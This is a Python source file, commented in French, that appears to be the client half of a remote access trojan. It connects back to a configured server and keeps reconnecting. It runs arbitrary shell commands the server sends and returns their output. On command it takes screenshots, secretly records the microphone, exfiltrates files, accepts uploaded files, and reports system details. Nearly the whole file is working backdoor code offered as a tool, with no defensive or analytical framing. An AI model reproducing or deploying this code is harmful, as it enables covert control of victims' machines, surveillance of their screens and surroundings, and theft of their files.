

import socket, os, subprocess, sys, re, platform, tqdm
from datetime import datetime
try:
    import pyautogui
except KeyError:
    # On test si la cible dispose d'un dispositif d'affichage, pour le cas des server en console 
    pyautogui_imported = False
else:
    pyautogui_imported = True
import sounddevice as sd
from tabulate import tabulate
from scipy.io import wavfile
import psutil, GPUtil


SERVER_HOST = '127.0.0.1'  # Adresse du server 
SERVER_PORT = 2024         # Port d'écoute du server 
BUFFER_SIZE = 1440         # Taille MTU
SEPARATOR = "<sep>"


class Client:
    def __init__(self, host, port, verbose=False):
        self.host = host
        self.port = port
        self.verbose = verbose
        # Connexion au server 
        self.socket = self.connect_to_server()
        # Variable pour contenir le repertoire courant de la cible 
        self.cwd = None
        self.already_connect = False
    
    def connect_to_server(self, custom_port=None):
        # Création du socket 
        s = socket.socket()
        # Connexion du client au server 
        if custom_port:
            port = custom_port
        else:
            port = self.port
        if self.verbose:
            print(f" Nouveau client connecté {self.host}:{port}")
        s.connect((self.host, port))
        if self.verbose:
            print(" Client connecté avec succes ! ")
        return s    
    
    def start(self):
        # Recuperer le repertoire de travail de la cible en cours 
        self.cwd = os.getcwd()
        self.socket.send(self.cwd.encode())
        while True:
            # Reception des commandes depuis le server 
            command = self.socket.recv(BUFFER_SIZE).decode()
            # execution de la commande du server 
            output = self.handle_command(command)
            if output == "break":
                # Casser la boucle d'execution, et quitter le client en cours 
                break
            elif output in ["exit", "quit"]:
                continue
            # Recuperer le CWD du client pour l'envoyer au serveur 
            self.cwd = os.getcwd()
            # Formatter la sortit et l'envoyer au serveur 
            message = f"{output}{SEPARATOR}{self.cwd}"
            self.socket.sendall(message.encode())
        # TOUJOURS FERMER LES CONNEXIONS CLIENTES 
        self.socket.close()
    
    def handle_command(self, command):
        if self.verbose:
            print(f"Execution de la commande : [{command}]")
        if command.lower() in ["exit", "quit"]:
            output = "exit"
        elif command.lower() == "abort":
            output = "abort"

        elif (match := re.search(r"cd\s*(.*)", command)):
            output = self.change_directory(match.group(1))
        
        elif (match := re.search(r"screenshot\s*(\w*)", command)):
            # Si disposotif graphique, prendre une capture d'ecran et enregistrer 
            if pyautogui_imported:
                output = self.take_screenshot(match.group(1))
            else:
                output = "Affichage non pris en compte par ce systeme ! :( ..."
        
        elif (match := re.search(r"recordmic\s*([a-zA-Z0-9]*)(\.[a-zA-Z]*)\s*(\d*)", command)):
            # Enregistrer le micro par defautpresent sur le poste 
            audio_filename = match.group(1) + match.group(2)
            try:
                seconds = int(match.group(3))
            except ValueError:
                # Si aucune seconde fournis en parametre, prendre 10 seconde par default 
                seconds = 10
            output = self.record_audio(audio_filename, seconds=seconds)

        elif (match := re.search(r"download\s*(.*)", command)):
            # Recuperer le filename et envoyer si existe 
            filename = match.group(1)
            if os.path.isfile(filename):
                output = f"Le fichier >>[{filename}]<< est envoyer "
                self.send_file(filename)
            else:
                output = f"Le fichier >>[{filename}]<< est introuvable ! "            
    
        elif (match := re.search(r"upload\s*(.*)", command)):
            # Recevoir le fichier envoyer depuis le serveur 
            filename = match.group(1)
            output = f"Le fichier  >>]{filename}[<< receptionner ! "
            self.receive_file()
        
        elif (match := re.search(r"sysinfo.*", command)):
            # Extraction des informations Hardware & Systeme 
            output = Client.get_sys_hardware_info() 
        
        else:
            # Executer la commande et envoyer la sortit 
            output = subprocess.getoutput(command)
        return output
    
    def change_directory(self, path):
        if not path:
            # chemin introuvable, ne rien renvoyer ! 
            return ""
        try:
            os.chdir(path)
        except FileNotFoundError as e:
            # renvoyer l'erreur dans la sortit 
            output = str(e)
        else:
            # Si l'operation reussit ne rien renvoyer ! 
            output = ""
        return output
    
    def take_screenshot(self, output_path):
        # Prendre une capture d'ecran avec pyautogui
        img = pyautogui.screenshot()
        if not output_path.endswith(".png"):
            output_path += ".png"
        # Enregistrer en PNG
        img.save(output_path)
        output = f"Image enregistrer sous : {output_path}"
        if self.verbose:
            print(output)
        return output
    
    def record_audio(self, filename, sample_rate=16000, seconds=3):
        # Enregistrement audio ! 
        if not filename.endswith(".wav"):
            filename += ".wav"
        myrecording = sd.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=2)
        sd.wait() # Attendre jusqu'a la fin de l'enregistrement 
        wavfile.write(filename, sample_rate, myrecording) # Enregistrer le fichier audio
        output = f"Fichier audio enregistrer sous : {filename}"
        if self.verbose:
            print(output)
        return output

    def receive_file(self, port=2023):
        s = self.connect_to_server(custom_port=port)
        Client._receive_file(s, verbose=self.verbose)
                             
    def send_file(self, filename, port=2023):
        s = self.connect_to_server(custom_port=port)
        Client._send_file(s, filename)
    
    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=4096,verbose=False):
        # Reception des info du fichier a recevoir via le socket 
        received = s.recv(buffer_size).decode()
        filename, filesize = received.split(SEPARATOR)
        # Effacer le chemin absolue et garder uniquement le filename 
        filename = os.path.basename(filename)
        # Convertir la taille en entier 
        filesize = int(filesize)
        # Commencer la reception du fichier 
        # et ecrire les data dans un fichiers ouvert en stream 
        if verbose:
            progress = tqdm.tqdm(range(filesize), f"Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
        else:
            progress = None
        with open(filename, "wb") as f:
            while True:
                bytes_read = s.recv(buffer_size)
                if not bytes_read:
                    break
                f.write(bytes_read)
                if verbose:
                    progress.update(len(bytes_read))
        s.close()

    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=4096):
        # Recupere la taille du fichier envoyer 
        filesize = os.path.getsize(filename)
        # Envoie du filename et du sizefile 
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        # Commencer l'envoie 
        # Activer la barre de progression! Encore pour le kiFF :) :) :) :) ! AHHHHHHHHHHHHHH 
        progress = tqdm.tqdm(range(filesize), f" [info] : Envoie >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(buffer_size)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                progress.update(len(bytes_read))
        s.close()

    @classmethod
    def get_sys_hardware_info(cls):
        def get_size(bytes, suffix="B"):
            """
                Formattage de la taille des memoires 
                e.g:
                    1253656 => '1.20MB'
                    1253656678 => '1.17GB'
            """
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor
        
        output = ""
        output += "="*40 + "System Information" + "="*40 + "\n"
        uname = platform.uname()
        output += f"System: {uname.system}\n"
        output += f"Node Name: {uname.node}\n"
        output += f"Release: {uname.release}\n"
        output += f"Version: {uname.version}\n"
        output += f"Machine: {uname.machine}\n"
        output += f"Processor: {uname.processor}\n"
        return output

def printbanniere():
    from os import system
    from time import sleep
    print(open('skull.txt').read())
    system('cls')

if __name__ == "__main__":
    while 1:
        printbanniere()
        print(open("skull.txt").read())
        try : 
            
            client = Client(SERVER_HOST, SERVER_PORT)
            client.start()
        except KeyboardInterrupt as e : 
            try : 
                conf = input(" Voulez-vous vraiment arretez le programme ? (O/N) -> ")
            except Exception as e : 
                continue
            else : 
                if conf in ['o','O','Oui','oui','y','Y','yes']: 
                    print("\n\n", "[ Vous avez quitter le programme :) ! ]".center(80,'~'))
                    exit(0)
                else: 
                    continue 
        except WindowsError: 
            continue




